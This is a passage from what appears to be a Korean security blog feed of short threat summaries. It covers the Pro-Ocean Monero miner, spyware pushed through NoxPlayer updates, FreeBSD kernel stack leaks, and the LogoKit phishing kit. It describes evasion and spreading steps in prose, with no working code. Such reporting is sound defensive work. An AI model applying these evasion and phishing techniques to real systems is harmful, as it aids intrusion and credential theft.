&#xC2E4;&#xD589;</li><li><code>main_ReleaseExescan</code>&#xC744; &#xD1B5;&#xD574; infection script &#xC2E4;&#xD589;</li></ol><p><code>LD_PRELOAD</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC228;&#xAE30;&#xACE0; <code>Libprocesshider</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC228;&#xAE30;&#xBA70; python infection script&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; public IP&#xC640; &#xB3D9;&#xC77C;&#xD55C; 16&#xBE44;&#xD2B8; &#xC11C;&#xBE0C;&#xB137;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xAC10;&#xC5FC;&#xC744; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. python script&#xB294; &#xC545;&#xC131; http &#xC11C;&#xBC84;&#xC5D0;&#xC11C; installation script&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xBCF4;&#xB0B4; Pro-Ocean&#xC744; &#xC124;&#xCE58;&#xD558;&#xC5EC; &#xD655;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;. Installation script&#xB294; bash&#xB85C; &#xC791;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC21C;&#xC11C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>Luoxk, BillGates, XMRig, Hashfish &#xB4F1;&#xC758; &#xB2E4;&#xB978; &#xBA40;&#xC6E8;&#xC5B4;&#xB098; Miner &#xC0AD;&#xC81C; &#xC2DC;&#xB3C4;.</li><li>&#xB2E4;&#xB978; &#xBA40;&#xC6E8;&#xC5B4;&#xAC00; &#xBCF5;&#xAD6C;&#xB420; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xBAA8;&#xB4E0; cron task &#xC0AD;&#xC81C;</li><li>&#xC778;&#xD130;&#xB137;&#xC5D0; &#xBAA8;&#xB4E0; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xAE30; &#xC704;&#xD574; iptables &#xBC29;&#xD654;&#xBCBD; &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>Tencent Cloud&#xB098; Alibaba Cloud&#xC5D0;&#xC11C; &#xBA40;&#xC6E8;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xACBD;&#xC6B0;, &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C;&#xB97C; &#xC704;&#xD574; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; agents &#xC0AD;&#xC81C;</li><li>SSH key&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB2E4;&#xB978; &#xAE30;&#xAE30;&#xB97C; &#xAC10;&#xC5FC;&#xC2DC;&#xD0A4;&#xB294; &#xB370; &#xC0AC;&#xC6A9;</li></ol><p>&#xB610;&#xD55C; Monero &#xCC44;&#xAD74;&#xC744; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xAE30; &#xC704;&#xD574; Watchdog Module&#xC744; &#xD1B5;&#xD574; CPU &#xC0AC;&#xC6A9;&#xB7C9;&#xC774; 30%&#xAC00; &#xB118;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xAC15;&#xC81C; &#xC885;&#xB8CC;&#xD558;&#xACE0;, &#xBA40;&#xC6E8;&#xC5B4;&#xAC00; &#xC791;&#xB3D9; &#xC911;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC791;&#xB3D9; &#xC548; &#xD560; &#xC2DC; &#xC2E4;&#xD589;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>cloud</tag>
      
      <tag>cryptocurrency</tag>
      
      <tag>monero</tag>
      
      <tag>rocke</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] NoxPlayer Spyware</title>
    <link href="/2021/02/03/fabu1ous/2021-02-03/"/>
    <url>/2021/02/03/fabu1ous/2021-02-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/02/a-new-software-supplychain-attack.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Cyber+Security+Blog%29">A new Software Supply-Chain Attack Targeted Millions With Spyware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>NoxPlayer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ESET&#xC5D0;&#xC11C; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130; NoxPlayer&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xD55C; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xAC00; &#xBC30;&#xD3EC;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; NoxPlayer&#xC758; &#xAC1C;&#xBC1C;&#xC0AC; BigNox&#xC758; &#xD30C;&#xC77C; &#xD638;&#xC2A4;&#xD305; &#xC11C;&#xBC84;&#xB97C; &#xD574;&#xD0B9;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; URL&#xC744; &#xC870;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC138; &#xC885;&#xB958;&#xC758; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xBC30;&#xD3EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB294; &#xAE08;&#xC804;&#xC801; &#xC774;&#xC775; &#xBCF4;&#xB2E8; &#xD2B9;&#xC815; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C; &#xAC10;&#xC2DC; &#xBAA9;&#xC801; &#xAE30;&#xB2A5;&#xC5D0; &#xCD08;&#xC810;&#xC774; &#xB9DE;&#xCDB0;&#xC838; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p>NoxPlayer &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xAC00; &#xBC30;&#xD3EC;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>NoxPlayer &#xC2DC;&#xC791;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC11C;&#xBC84;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC694;&#xCCAD;</li><li>&#xC11C;&#xBC84;&#xC5D0;&#xC11C; BigNox CDN network&#xB97C; &#xD1B5;&#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; URL&#xC744; &#xC81C;&#xACF5;</li><li>&#xD574;&#xB2F9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC9C4;&#xD589;</li><li>&#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0; &#xC81C;&#xACF5;</li></ol><p>&#xBC30;&#xD3EC;&#xB41C; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Gh0st RAT ( Remote Administration Tool )</li><li>PoisonIvy RAT</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Gh0st_RAT">https://en.wikipedia.org/wiki/Gh0st_RAT</a></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf">https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>spyware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Uninitialized kernel stack leaks in freeBSD</title>
    <link href="/2021/02/02/l0ch/2021-02-02/"/>
    <url>/2021/02/02/l0ch/2021-02-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/elttam/advisories/tree/master/CVE-2020-25578%20CVE-2020-25579">CVE-2020-25578/CVE-2020-25579 freeBSD fsdisclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>freeBSD</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>BSD&#xACC4;&#xC5F4;&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC778; freeBSD&#xC758; &#xC5EC;&#xB7EC; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>tmpfs</li><li>smbfs</li><li>autofs</li><li>mqueuefs</li><li>msdosfs</li></ul><p>&#xCEE4;&#xB110; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xB294; <code>dirent</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD544;&#xB4DC;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> {</span>                                                                     <span class="hljs-keyword">ino_t</span>      d_fileno;        <span class="hljs-comment">/* file number of entry */</span>                          <span class="hljs-keyword">off_t</span>      d_off;       <span class="hljs-comment">/* directory offset of entry */</span>                         <span class="hljs-keyword">__uint16_t</span> d_reclen;        <span class="hljs-comment">/* length of this record */</span>                         <span class="hljs-keyword">__uint8_t</span>  d_type;      <span class="hljs-comment">/* file type, see below */</span>                              <span class="hljs-keyword">__uint8_t</span>  d_pad0;                                                              <span class="hljs-keyword">__uint16_t</span> d_namlen;        <span class="hljs-comment">/* length of string in d_name */</span>                    <span class="hljs-keyword">__uint16_t</span> d_pad1;                                                          <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __BSD_VISIBLE                                                               </span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXNAMLEN   255                                                         </span>    <span class="hljs-keyword">char</span>    d_name[MAXNAMLEN + <span class="hljs-number">1</span>];  <span class="hljs-comment">/* name must be no longer than this */</span>      <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span>                                                                           </span>    <span class="hljs-keyword">char</span>    d_name[<span class="hljs-number">255</span> + <span class="hljs-number">1</span>];    <span class="hljs-comment">/* name must be no longer than this */</span>          <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>                                                                          </span>};</code></pre><p>&#xC774;&#xC911; msdosfs&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>msdosfs_readdir</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; MSDOS &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xB8E8;&#xD2B8;&#xC5D0;&#xC11C; <code>readdir</code> &#xC774; &#xD638;&#xCD9C;&#xB41C; &#xACBD;&#xC6B0; <code>dirent_terminate</code>&#xC5D0;&#xC11C; <code>d_pad0</code>, <code>d_pad1</code>,<code>d_name</code> &#xD544;&#xB4DC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD55C; &#xC774;&#xD6C4; <code>uiomove</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>struct dirent dirbuf</code> &#xAC1D;&#xCCB4;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB8E8;&#xD2B8; &#xC774;&#xC678;&#xC758; MSDOS &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; <code>readdir</code>&#xC744; &#xD638;&#xCD9C;&#xD55C; &#xACBD;&#xC6B0; <code>d_pad0</code>, <code>d_pad1</code> &#xD544;&#xB4DC;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; <code>uiomove</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xC5B4; &#xCEE4;&#xB110;&#xC758; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>msdosfs&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xB2E4;&#xC74C; &#xD568;&#xC218; &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xC2A4;&#xD0DD;&#xC5D0; <code>struct dirent</code> &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>tmpfs_dir_getdotdent</code></li><li><code>tmpfs_dir_getdotdotdent</code></li><li><code>smbfs_readvdir</code></li><li><code>autofs_readdir_one</code></li><li><code>mqfs_readdir</code></li></ul><p>&#xADF8;&#xB7EC;&#xB098; &#xAC1D;&#xCCB4;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xC804;&#xC5D0;<code>d_off</code> &#xD544;&#xB4DC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCEE4;&#xB110;&#xC758; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xAC00; &#xB0A8;&#xC544;&#xC788;&#xC73C;&#xBA70; &#xC774;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>uninitialized stack</tag>
      
      <tag>L0ch</tag>
      
      <tag>freeBSD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 피싱 폼 데이터를 동적으로 생성하는 LogoKit</title>
    <link href="/2021/02/01/idioth/2021-02-01/"/>
    <url>/2021/02/01/idioth/2021-02-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://community.riskiq.com/article/a068810a">LogoKit: Simple, Effective, and Deceptive</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xC545;&#xC131; URL&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC0AC;&#xB78C;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>RiskIQ&#xC5D0;&#xC11C; DOM(Document Object Model)&#xACFC; &#xC0C1;&#xD638; &#xC791;&#xC6A9;&#xD558;&#xC5EC; HTML form data&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xD53C;&#xC2F1; &#xD0A4;&#xD2B8;&#xC778; LogoKit&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>LogoKit&#xC740; &#xBCF5;&#xC7A1;&#xD55C; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xACFC; &#xB2E4;&#xC591;&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xD53C;&#xC2F1; &#xD0A4;&#xD2B8;&#xC640; &#xB2EC;&#xB9AC; embeddable&#xD55C; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD568;&#xC218;&#xB97C; &#xBAA8;&#xC544;&#xB480;&#xC73C;&#xBA70; DOM&#xACFC;&#xC758; &#xC0C1;&#xD638; &#xC791;&#xC6A9;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC0C1;&#xD638; &#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xD398;&#xC774;&#xC9C0; &#xB0B4;&#xC758; &#xCF58;&#xD150;&#xCE20;&#xC640; HTML form data&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>LogoKit&#xC740; &#xD53C;&#xD574;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C;&#xC774; &#xD3EC;&#xD568;&#xB41C; URL(<code>phishingpage[.]site/login.html#victim@company.com</code>)&#xC744; &#xC774;&#xBA54;&#xC77C;&#xB85C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. URL&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC774;&#xBA54;&#xC77C;&#xC740; <a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/hash">location hash</a>&#xB85C; &#xC0AC;&#xC6A9;&#xC790;/&#xD68C;&#xC0AC; &#xB3C4;&#xBA54;&#xC778;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xC800;&#xC7A5;&#xB418;&#xBA70; &#xD68C;&#xC0AC; &#xB3C4;&#xBA54;&#xC778; &#xB85C;&#xACE0;&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>username</code> &#xD544;&#xB4DC;&#xC5D0; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xCC44;&#xC6CC; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC785;&#xB825;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xD53C;&#xD574;&#xC790;&#xAC00; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; &#xC774;&#xBA54;&#xC77C;&#xC774; &#xC720;&#xD6A8;&#xD55C; &#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; &#xC785;&#xB825;&#xC740; &#xC554;&#xD638;&#xAC00; &#xD2C0;&#xB838;&#xC73C;&#xB2C8; &#xB2E4;&#xC2DC; &#xC785;&#xB825;&#xD558;&#xB77C;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD45C;&#xC2DC;&#xD558;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC785;&#xB825;&#xC5D0;&#xC11C; &#xC774;&#xBA54;&#xC77C;&#xACFC; &#xC554;&#xD638;&#xB97C; &#xC678;&#xBD80;&#xB85C; &#xC804;&#xC1A1;&#xD55C; &#xD6C4; &#xD68C;&#xC0AC; &#xC0AC;&#xC774;&#xD2B8;&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Logokit&#xB294; &#xADDC;&#xBAA8;&#xAC00; &#xC791;&#xACE0; &#xD68C;&#xC0AC; &#xB85C;&#xADF8;&#xC778; &#xD3EC;&#xD138;&#xC744; &#xBAA8;&#xBC29;&#xD558;&#xB294; &#xC2DD;&#xC758; &#xAC04;&#xB2E8;&#xD55C; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xCD95;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, Firebase, Github, Oracle Cloud &#xB4F1; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xAC1C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; Javascript&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xB9E4;&#xC6B0; &#xC704;&#xD611;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD0C0;&#xAE43; &#xB2F9; &#xB2E8;&#xC77C; URL&#xC744; &#xAC16;&#xACE0; &#xD68C;&#xC0AC; &#xB85C;&#xACE0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xC27D;&#xAC8C; &#xC704;&#xD611;&#xC5D0; &#xB178;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xB9CE;&#xC740; &#xC8FC;&#xC758;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>LogoKit &#xD53C;&#xC2F1; &#xB9C1;&#xD06C;&#xC758; &#xC608;&#xC2DC; : <code>hxxps://324634XXXa2616-dot-XXXX-301XX4.df.r.appspot.com/#recruitmentXXX@XXX.com</code></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>social engineering</tag>
      
      <tag>idioth</tag>
      
      <tag>logokit</tag>
      
      <tag>phishkit</tag>
      
      <tag>phishing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 part1 - pwntools for windows</title>
    <link href="/2021/01/31/l0ch/pwncoolsexy-part1/"/>
    <url>/2021/01/31/l0ch/pwncoolsexy-part1/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC624;&#xB298;&#xC740; &#xC0C8;&#xB85C; &#xC5F0;&#xC7AC;&#xD560; &#xC2DC;&#xB9AC;&#xC988;&#xBB3C;&#xC744; &#xC8FC;&#xC12C;&#xC8FC;&#xC12C; &#xCC59;&#xACA8; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C;&#xBAA9;&#xBD80;&#xD130; &#xC815;&#xC0C1;&#xC774; &#xC544;&#xB2CC; &#xB290;&#xB08C;&#xC774; &#xC2AC;&#xC2AC; &#xC624;&#xC2DC;&#xC8E0;..?</p><p>&#xB54C;&#xB294; &#xC2DC;&#xB9AC;&#xC988;&#xBB3C; &#xAE30;&#xD68D; &#xD68C;&#xC758; &#xC911; &#xC544;&#xBB34; &#xC0DD;&#xAC01; &#xC5C6;&#xC774; &#x201C;&#xD380;(pwn)&#xCFE8;&#xC139;&#xC88C; &#xCEE8;&#xC149; &#xC5B4;&#xB5B0;?&#x201D;&#xC774;&#xB77C;&#xACE0; &#xB9D0;&#xD588;&#xB294;&#xB370; &#xD300;&#xC6D0;&#xB4E4; &#xBC18;&#xC751;&#xC774; &#xACA9;&#xD558;&#xB354;&#xB77C;&#xAD6C;&#xC694;.</p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/1.png" alt></p><blockquote><p>&#xB0B4;&#xAC00; &#xC774; &#xAD6C;&#xC5ED;&#xC758; &#xBBF8;&#xCE5C;X&#xC774;&#xB2E4;!!</p></blockquote><p>&#xD68C;&#xC758;&#xD558;&#xBA74;&#xC11C; &#xB534;&#xC9D3;&#xD558;&#xB2E4;&#xAC00; &#xBC49;&#xC740; &#xB9D0;&#xC774; &#xBCF8;&#xC758; &#xC544;&#xB2C8;&#xAC8C; &#xADF9;&#xCC2C;(?)&#xC744; &#xB4E4;&#xC5B4;&#xBC84;&#xB824; &#xD0C4;&#xC0DD;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xC2DC;&#xB9AC;&#xC988;.. &#xACFC;&#xC5F0; &#xC81C;&#xB300;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC744;&#xC9C0;!</p><h1 id="pwnable&#xC740;-cool&#xD558;&#xACE0;-sexy&#xD558;&#xAC8C;"><a href="#pwnable&#xC740;-cool&#xD558;&#xACE0;-sexy&#xD558;&#xAC8C;" class="headerlink" title="pwnable&#xC740; cool&#xD558;&#xACE0; sexy&#xD558;&#xAC8C;"></a>pwnable&#xC740; cool&#xD558;&#xACE0; sexy&#xD558;&#xAC8C;</h1><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/2.png" alt></p><blockquote><p>&#xD3EC;&#xB108;&#xBE14;&#xC744; &#xD560; &#xB54C;&#xB294; &#xC990;&#xAC70;&#xC6CC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xCFE8;&#xD558;&#xACE0; &#xC139;&#xC2DC;&#xD574;&#xC57C; &#xD558;&#xC8E0;</p></blockquote><p><em><del>&#xC624;&#xB298;&#xBD80;&#xD130;</del></em> &#xC81C; &#xC88C;&#xC6B0;&#xBA85;&#xC785;&#xB2C8;&#xB2E4;. &#xBC11;&#xB3C4; &#xB05D;&#xB3C4; &#xC5C6;&#xC774; cool&#xD558;&#xACE0; sexy&#xD558;&#xAC8C; &#xD3EC;&#xB108;&#xBE14;&#xC744; &#xBFCC;&#xC218;&#xB294; &#xAC83;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xD558;&#xB294; &#xC2DC;&#xB9AC;&#xC988;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xB3C4; &#xACC4;&#xD68D;&#xC740; &#xC138;&#xC6B0;&#xACE0; &#xBFCC;&#xC154;&#xC57C;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD234; &#xC18C;&#xAC1C;</li><li>Windows exploit technique</li><li>CTF Challenge</li></ul><p>&#xC815;&#xB3C4;&#xB85C; &#xC9C4;&#xD589;&#xB420; &#xC608;&#xC815;&#xC774;&#xBA70; part 5&#xAE4C;&#xC9C0; &#xAD6C;&#xC0C1;&#xC911;&#xC774;&#xC9C0;&#xB9CC; &#xBB50; &#xC0AC;&#xB78C; &#xC77C;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xC9C0; &#xBAA8;&#xB974;&#xB294;&#xAC70;&#xB2C8; &#xC77C;&#xB2E8; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xC8E0; &#x314E; &#xC2DC;&#xB9AC;&#xC988; &#xCCAB; &#xAE00;&#xC740; &#xAC00;&#xBCCD;&#xAC8C; &#xCD9C;&#xBC1C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAC04;&#xB2E8;&#xD55C; Windows &#xD234; &#xC18C;&#xAC1C; &#xC815;&#xB3C4;&#xB85C; &#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="pwntools-for-windows-winpwn"><a href="#pwntools-for-windows-winpwn" class="headerlink" title="pwntools for windows - winpwn"></a>pwntools for windows - 